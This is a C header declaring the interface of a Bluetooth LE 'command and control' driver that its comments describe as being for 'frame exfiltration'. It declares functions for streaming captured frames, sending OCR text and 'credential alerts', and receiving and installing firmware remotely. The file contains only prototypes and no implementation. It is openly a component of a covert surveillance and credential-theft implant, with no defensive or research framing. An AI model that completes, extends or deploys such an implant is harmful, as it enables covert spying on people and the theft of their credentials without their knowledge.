/**
 * @file ble_c2_driver.h
 * @brief BLE 5.2 C2 (Command & Control) driver for frame exfiltration
 *
 * Custom GATT service for encrypted frame data streaming and device control.
 *
 * Author: jayis1
 * @copyright Copyright (c) 2026 jayis1. All rights reserved.
 * @license GPL-2.0
 */

#ifndef BLE_C2_DRIVER_H
#define BLE_C2_DRIVER_H

#include <stdint.h>
#include <stdbool.h>
#include "registers.h"

#ifdef __cplusplus
extern "C" {
#endif

/**
 * @brief Initialize BLE stack with device name
 */
void ble_c2_init(const uint8_t *device_name, uint8_t name_len);

/**
 * @brief Start BLE advertising
 */
void ble_c2_start_advertising(void);

/**
 * @brief Stop BLE advertising
 */
void ble_c2_stop_advertising(void);

/**
 * @brief Send frame header metadata
 * @return Number of bytes sent
 */
uint32_t ble_c2_send_frame_header(const frame_metadata_t *meta);

/**
 * @brief Send raw data chunk via BLE
 * @return Number of bytes sent
 */
uint32_t ble_c2_send_data(const uint8_t *data, uint16_t length);

/**
 * @brief Send OCR text result
 */
uint32_t ble_c2_send_ocr_text(const uint8_t *data, uint16_t length, uint32_t frame_idx);

/**
 * @brief Send credential alert
 */
uint32_t ble_c2_send_credential_alert(const uint8_t *data, uint16_t length, uint32_t frame_idx);

/**
 * @brief Receive firmware image via BLE
 */
uint32_t ble_c2_receive_firmware(uint8_t *buffer, uint32_t max_size, uint32_t *crc_out);

/**
 * @brief Trigger DFU (Device Firmware Update)
 */
void ble_c2_trigger_dfu(void);

/**
 * @brief Check if BLE is connected
 */
bool ble_c2_is_connected(void);

#ifdef __cplusplus
}
#endif

#endif /* BLE_C2_DRIVER_H */